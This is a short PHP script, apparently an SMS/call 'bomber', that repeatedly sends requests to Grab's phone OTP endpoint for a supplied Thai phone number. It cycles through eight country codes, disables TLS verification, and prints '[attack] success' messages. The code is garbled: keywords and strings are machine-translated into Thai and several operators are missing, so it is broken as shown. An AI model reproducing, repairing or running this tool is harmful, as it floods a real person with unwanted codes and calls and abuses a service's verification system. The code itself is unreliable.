<?php
$ argv [ 1 ] = substr ( $ argv [ 1 ], 1 );
$ argv [ 1 ] ="66" $ argv [ 1 ];

if (! isset ( $ argv [ 1 ]) || ( isset ( $ argv [ 2 ]) && ! in_array ( strtoupper ( $ argv [ 2 ]), [ "SMS" , "CALL" , "ALL" ])) ) {
	echo  "php grab.php <PHONENUMBER> <SMS|CALL|ALL>" ;
	ทางออก;
} elseif (! isset ( $ argv [ 2 ])) {
	$ argv [ 2 ] = "SMS" ;
}
$ประเทศ = [ "MY" , "SG" , "ID" , "TH" , "VN" , "KH" , "PH" , "MM" ];
สับเปลี่ยน ( $ประเทศ );
$ผม = 0 ;
foreach ( $ประเทศ เป็น $ countryCode ) {
		$สำเร็จ =เท็จ ;
		ในขณะที่ (! $สำเร็จ ) {
			foreach ([ "SMS" , "CALL" ] เป็น วิธีการ$ ) {
				if ( strtoupper ( $ argv [ 2 ]) === "ALL" || strtoupper ( $ argv [ 2 ]) === $วิธี ) {
					$ result = @ file_get_contents ( "https://api.grab.com/grab/v1/phone/otp" , false , stream_context_create ([
						"http" => [
							"method" => "POST" ,
							"header" => "ประเภทเนื้อหา: application/x-www-form-urlencoded" ,
							"เนื้อหา" => "วิธีการ=" . $วิธีการ "&countryCode=" . $ countryCode "&phoneNumber=" . $ argv [ 1 ] "&templateID=&numDigits=4"
						],
						"ssl" => [
							"verify_peer" => เท็จ ,
							"verify_peer_name" => false
						]
					]));
					ถ้า ( $ผล ) {
						ก้อง "[โจมตี] ความสำเร็จโทรศัพท์:" $ argv [ 1 ] " ประเทศ: " . $ countryCode " โหมด: " . $วิธีการ "\n" ;
						$สำเร็จ =จริง ;
					}
				}
			}
		}
	}

?>
